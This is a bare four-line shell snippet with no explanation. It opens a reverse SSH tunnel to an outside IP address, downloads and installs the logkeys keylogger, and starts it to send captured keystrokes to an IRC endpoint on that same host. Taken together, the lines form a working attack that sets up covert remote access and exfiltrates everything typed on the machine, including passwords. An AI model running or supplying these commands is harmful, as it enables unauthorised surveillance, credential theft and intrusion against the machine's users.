ssh -R 2222:localhost:22 gizmo@75.138.184.49
wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
